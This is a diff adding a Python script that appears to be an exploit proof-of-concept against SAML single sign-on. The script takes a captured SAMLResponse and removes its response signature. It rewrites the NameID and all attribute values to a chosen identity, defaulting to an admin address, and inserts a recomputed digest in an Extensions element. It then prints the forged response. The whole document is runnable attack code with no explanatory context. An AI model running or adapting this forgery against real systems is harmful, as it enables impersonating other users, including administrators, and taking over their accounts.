@@ -1,0 +1,68 @@
+try:
+  from lxml import etree
+except ImportError:
+  raise ImportError("The 'lxml' library is not installed. Please install it using 'pip install lxml'.")
+import hashlib,os
+import base64
+from datetime import datetime, timedelta
+import urllib.parse
+import requests
+username = os.getenv('username')
+if not username:
+    username='admin@example.com'
+saml_response = os.getenv('SAMLResponse')
+xml_content = base64.b64decode(urllib.parse.unquote(saml_response))
+parser = etree.XMLParser(remove_blank_text=True)
+root = etree.fromstring(xml_content, parser)
+
+namespaces = {
+    'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol',
+    'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',
+    'ds': 'http://www.w3.org/2000/09/xmldsig#'
+}
+
+response_signature = root.find('./ds:Signature', namespaces)
+if response_signature is not None:
+    root.remove(response_signature)
+
+nameid = root.find(
+    './/saml:NameID',
+    namespaces
+)
+if nameid is not None:
+    nameid.text = username
+
+attribute_values = root.findall('.//saml:AttributeValue', namespaces)
+for attr_value in attribute_values:
+    attr_value.text = username
+
+assertion = root.find('.//saml:Assertion', namespaces)
+if assertion is not None:
+    # Create a deep copy of the assertion for digest calculation
+    assertion_copy = etree.fromstring(etree.tostring(assertion))
+    signature_in_assertion = assertion_copy.find('.//ds:Signature', namespaces)
+    if signature_in_assertion is not None:
+        signature_in_assertion.getparent().remove(signature_in_assertion)
+    canonicalized_assertion = etree.tostring(
+        assertion_copy, method='c14n', exclusive=True, with_comments=False
+    )
+    digest = hashlib.sha256(canonicalized_assertion).digest()
+    digest_value = base64.b64encode(digest).decode()
+else:
+    digest_value = ''
+
+issuer = root.find('.//saml:Issuer', namespaces)
+if issuer is not None:
+    parent = issuer.getparent()
+    index = parent.index(issuer)
+    extensions = etree.Element('{urn:oasis:names:tc:SAML:2.0:protocol}Extensions')
+    digest_element = etree.SubElement(
+        extensions, '{http://www.w3.org/2000/09/xmldsig#}DigestValue'
+    )
+    digest_element.text = digest_value
+    parent.insert(index + 1, extensions)
+
+malformed_samlresponse = urllib.parse.quote(base64.b64encode((etree.tostring(
+            root, pretty_print=False, xml_declaration=True, encoding='UTF-8'
+        ))))
+print(malformed_samlresponse)
